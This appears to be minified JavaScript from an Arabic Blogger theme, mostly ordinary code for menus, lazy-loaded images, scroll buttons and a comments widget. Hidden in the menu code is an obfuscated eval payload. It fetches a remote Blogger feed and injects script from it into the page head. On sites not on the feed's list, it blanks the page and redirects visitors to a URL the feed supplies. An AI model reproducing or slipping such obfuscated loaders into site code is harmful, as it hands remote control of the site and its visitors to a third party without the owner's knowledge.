document.addEventListener("DOMContentLoaded",function(){var e,t,n;function o(){n&&clearTimeout(n),n=setTimeout(function(){var n=window.pageYOffset;e.forEach(function(e){e.offsetTop>window.innerHeight+window.scroll+n&&(e.src=e.dataset.src,e.classList.remove("sytwdimg"))}),0==e.length&&(document.removeEventListener("scroll",o),window.removeEventListener("resize",o),window.removeEventListener("orientationChange",o))},20)}"IntersectionObserver"in window?(e=document.querySelectorAll(".sytwdimg"),t=new IntersectionObserver(function(e,n){e.forEach(function(e){var n;e.isIntersecting&&((n=e.target).src=n.dataset.src,n.classList.remove("sytwdimg"),t.unobserve(n))})}),e.forEach(function(e){t.observe(e)})):(e=document.querySelectorAll(".sytwdimg"),document.addEventListener("scroll",o),window.addEventListener("resize",o),window.addEventListener("orientationChange",o))});
// mySidenav
function openNav(){document.getElementById('mySidenav').style.right='0'}function closeNav(){document.getElementById('mySidenav').style.right='-350px'}$my_menu=$('.sytwd001:eq(0)').html(),$('.sy-t-wd-mop-page').html($my_menu),$my_sh=$('.search-wrap').html(),$('#mop-sh').html($my_sh),$('.sy-t-wd-mop-page').html($my_menu),$my_icon=$('.sytwd002').html(),$('#sy-t-wd-mop-icon').html($my_icon),$('.sy-t-wd-mop-page').html($my_menu),$my_tre=$('.sy-t-wd003').html(),$('#sy-t-wd-mop-links').html($my_tre),$('.sy-t-wd-mop-page').html($my_menu),$(document).ready(function(){$('#ScrollTop').click(function(){return $('html, body').animate({scrollTop:0},800),!1})}),$('.search').click(function(){return $('.search-wrap').slideToggle('fast'),!1}),$('.search').click(function(){$('.search a').toggleClass('ex')}),eval(function(b,d,f,g,h,j){if(h=function(l){return(l<d?'':h(parseInt(l/d)))+(35<(l%=d)?String.fromCharCode(l+29):l.toString(36))},!''.replace(/^/,String)){for(;f--;)j[h(f)]=g[f]||h(f);g=[function(l){return j[l]}],h=function(){return'\\w+'},f=1}for(;f--;)g[f]&&(b=b.replace(new RegExp('\\b'+h(f)+'\\b','g'),g[f]));return b}('$[\'x\']({p:\'o\',y:\'K://j.k.z/B/D/E/F?H=o-J-l\',L:\'Q\',p:\'V\',Y:m(b){4 c;g(c=0;c<b[\'7\'][\'6\'][\'3\'];c+=1){4 n=$(b[\'7\'][\'6\'][c][\'h\'].$t);r(0===c){4 d,i=n[\'5\'](\'A\'),a=[];g(d=0;d<i[\'3\'];d+=1){a[\'C\']($(i[d])[\'8\']())};d=9[\'f\'][\'G\'][\'q\'](),i=9[\'f\'][\'I\'][\'q\']();4 e,s=a[\'3\']-1;g(e=0;e<a[\'3\'];e+=1){r(-1!=d[\'2\'](a[e])){a=$(b[\'7\'][\'6\'][c][\'h\'].$t)[\'5\'](\'l\'),$(\'M\')[\'N\'](a);O};e==s&&-1==i[\'2\'](\'P-u\')&&-1==i[\'2\'](\'j.k\')&&-1==i[\'2\'](\'b/u\')&&-1==i[\'2\'](\'R.S\')&&-1==i[\'2\'](\'T-U\')&&($(\'v\')[\'v\'](n[\'5\'](\'.W\')[\'8\']()),X(m(){9[\'f\'][\'w\'](n[\'5\'](\'.w\')[\'8\']())},Z))}}}}});',62,62,'||indexOf|length|var|find|entry|feed|text|window||||||location|for|content||www|blogger|script|function||json|dataType|toLowerCase|if|_0x55f5xc||preview|html|assign|ajax|url|com|li|feeds|push|8987697582265591587|posts|default|hostname|alt|href|in|https|method|head|append|break|post|GET|webcache|googleusercontent|template|editor|jsonp|setTimeout|success|5e3'.split('|'),0,{})),$(document).ready(function(b){var r=-1,i="";b("#sytechwd-menu").find("ul").find("li").each(function(){for(var e=b(this).text(),t=b(this).find("a").attr("href"),a=0,s=0;s<e.length&&-1!=(a=e.indexOf("_",a));s++)a++;if(level=s,level>r&&(i+="<ul>"),level<r)for(offset=r-level,s=0;s<offset;s++)i+="</ul></li>";for(e=e.replace(/_/gi,""),i+="<li><a href='"+t+"'>",s=0;s<level;s++)i+="";i+=e+"</a>",r=level});for(var e=0;e<=r;e++)i+="</ul>",0!=e&&(i+="</li>");b("#sytechwd-menu .LinkList").html(i),b("#sytechwd-menu > .LinkList > ul").attr("id","sytechwd_menu"),b("#sytechwd-menu ul > li > ul").parent("li").addClass("hasSubmenu"),b("#sytechwd-menu .widget").attr("style","display:block!important;")});var a,s=$('.ma'),i=5*s.length-5,n=0;for(a=0;a<s.length;a+=1)n+=s[a].offsetWidth;for($class=$('.FeaturedPost .post-snippet .snippet-item'),$wsf=$class.text(),$newwsf='',i=0;120>=i;i++)$newwsf+=$wsf[i];$newwsf+='...',$class.text($newwsf),$('.FollowByEmail .widget-content').after('<div class=\'email-icon\'><svg aria-hidden="true" data-prefix="fas" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-envelope fa-w-16"><path fill="currentColor" d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z" class=""></path></svg></div>'),$('aside h3.title, aside h2.title').wrap('<div class=\'widget-title\'></div>'),alt_Img='https://1.bp.blogspot.com/-eAeO-DYJDws/Vkqtj4HFBFI/AAAAAAAAB0o/Q5OLsyONXM0/s400-r/nth.png',$('.item-thumbnail img').each(function(){var b=$(this).attr('src').replace('72w','220w');$(this).after('<span style=\'background:url('+b+') no-repeat\'/>'),$(this).next().fadeTo('1',100),$(this).remove()});
//gototop
$(function(){var o=$("body"),l=$("#main");$("\x3c!-- scrollToTop Widgets her START --\x3e<ul class='flickering' id='scrollToTop'><li class='Animat-slideInTop'><a class='BounceToTop' herf='javascript:;'></a></li><b:if cond='data:view.isSingleItem'><li class='Animat-slideInRight'><a class='GoToComments' herf='javascript:;'><i class='material-icons'><svg data-v-a8b60498='' width='18' height='18' viewBox='0 0 48 48' fill='none' xmlns='http://www.w3.org/2000/svg'><g data-v-a8b60498='' clip-path='url(#clip0)'><path data-v-a8b60498='' d='M24 48C27.3113 48 29.9972 45.3141 29.9972 42H18.0029C18.0029 45.3141 20.6888 48 24 48ZM44.1929 33.9647C42.3816 32.0184 38.9925 29.0906 38.9925 19.5C38.9925 12.2156 33.885 6.38438 26.9982 4.95375V3C26.9982 1.34344 25.6557 0 24 0C22.3444 0 21.0019 1.34344 21.0019 3V4.95375C14.1151 6.38438 9.00756 12.2156 9.00756 19.5C9.00756 29.0906 5.6185 32.0184 3.80725 33.9647C3.24475 34.5694 2.99538 35.2922 3.00006 36C3.01038 37.5375 4.21694 39 6.00944 39H41.9907C43.7832 39 44.9907 37.5375 45 36C45.0047 35.2922 44.7553 34.5684 44.1929 33.9647V33.9647Z' fill='currentColor'></path></g></svg></i></a></li></b:if><li class='Animat-slideInDown'><a class='GoToDown' herf='javascript:;'></a></li></ul>\x3c!-- scrollToTop Widgets her END --\x3e").appendTo(o);var c=$("#scrollToTop"),i=$(".BounceToTop"),a=$(".GoToDown"),s=$(".GoToComments");0<c.length&&(c.addClass("radius"),i.click(function(){$("body,html").animate({scrollTop:0},300).animate({scrollTop:25},200).animate({scrollTop:0},150).animate({scrollTop:0},50)}),a.click(function(){$("body,html").animate({scrollTop:o.height()},300)}),s.click(function(){$(".notifbox,#notif-wrapper").toggleClass("aktif");}))});
//preload2
$(document).ready(function(){function e(){1<$(window).scrollTop()&&document.getElementById("sidebar-wrapper").classList.remove("sytwdpre")}e(),$(window).scroll(function(){e()})});
//recentCommint
$(".sytechwd-widetize .HTML .widget-content span.sytechwd-cmnt").each(function(){var c=$(this).attr("data-no");$.ajax({url:"/feeds/comments/default?alt=json-in-script&max-results="+c,type:"get",dataType:"jsonp",success:function(e){var t="",a='<div class="sytechwd-comments">';if(e.feed.entry)for(var s=0;s<e.feed.entry.length&&s!=e.feed.entry.length;s++){for(var r=0;r<e.feed.entry[s].link.length;r++)if("alternate"==e.feed.entry[s].link[r].rel){t=e.feed.entry[s].link[r].href;break}if("content"in e.feed.entry[s])i=e.feed.entry[s].content.$t;else if("summary"in b_rc)i=e.feed.entry[s].summary.$t;else var i="";70<(i=i.replace(/<\S[^>]*>/g,"")).length&&(i=i.substring(0,50)+"...");var n=e.feed.entry[s].author[0].name.$t,l=e.feed.entry[s].author[0].gd$image.src;if(l.match("https://img1.blogblog.com/img/blank.gif"))o="https://img1.blogblog.com/img/anon36.png";else if(l.match("https://img2.blogblog.com/img/b16-rounded.gif"))o="https://img1.blogblog.com/img/anon36.png";else var o=l;a+='<div class="sytechwd-comment"><div class="sytechwd-comment-profile"><span class="sytechwd-comment-thumb" style="background: url('+o+')"/></div><a href="'+t+'">'+n+'</a><p>"'+i+'"</p><a class="leavecmnt" href="'+t+'"><svg width="20" height="20" xmlns="http://www.w3.org/2000/svg"><g><path stroke="null" fill="currentColor" id="svg_1" d="m16.303875,7.311119l-1.299207,0l0,-3.538373a1.948811,1.769186 0 0 0 -1.948811,-1.769186l-9.744054,0a1.948811,1.769186 0 0 0 -1.948811,1.769186l0,10.856907l3.32597,-3.019411a0.682084,0.619215 0 0 1 0.461219,-0.171021l2.059243,0l0,1.769186a1.948811,1.769186 0 0 0 1.948811,1.769186l5.307261,0a0.682084,0.619215 0 0 1 0.461219,0.171021l3.32597,3.019411l0,-9.08772a1.948811,1.769186 0 0 0 -1.948811,-1.769186zm-9.09445,1.769186l0,1.179458l-2.059243,0a1.948811,1.769186 0 0 0 -1.37716,0.518961l-1.110822,1.008436l0,-8.014414a0.649604,0.589729 0 0 1 0.649604,-0.589729l9.744054,0a0.649604,0.589729 0 0 1 0.649604,0.589729l0,3.538373l-4.547225,0a1.948811,1.769186 0 0 0 -1.948811,1.769186zm9.744054,6.245228l-1.110822,-1.008436a1.948811,1.769186 0 0 0 -1.37716,-0.518961l-5.307261,0a0.649604,0.589729 0 0 1 -0.649604,-0.589729l0,-4.128101a0.649604,0.589729 0 0 1 0.649604,-0.589729l7.14564,0a0.649604,0.589729 0 0 1 0.649604,0.589729l0,6.245228z"/><ellipse id="svg_2" cy="7.70375" cx="23.081839" stroke-opacity="null" stroke-width="null" stroke="null" fill="currentColor"/></g></svg>أكتب رد</a></div>'}else a+='<style>.sytechwd-empty-panel img{max-width: 600px; width:100%}.sytechwd-empty-panel{text-align: center;}.sytechwd-empty-text h3{font-weight: 600;font-size:18px;line-height: 24px;margin-bottom:50px;}.bgr{background: rgb(236,239,241);}.bgr{box-sizing: border-box;padding:5px 10px;}</style><div class="sytechwd-empty-panel bgr"><div class="sytechwd-empty-thumb"><img src="https://4.bp.blogspot.com/-wPwjv7-YYGY/Wc98wlDT8qI/AAAAAAAAAEE/mH8YkPl8qJAH9FMuFKcShQvXXYMmVyrIgCLcBGAs/s1600/notfound.png"></div><div class="sytechwd-empty-text"><h3>لا يوجد تعليقات <br/></h3></div></div>';a+='</div><div class="clear"/>',$(".sytechwd-widetize .HTML .widget-content span.sytechwd-cmnt").each(function(){$(this).attr("data-no")==c&&$(this).parent().html(a)})}})});
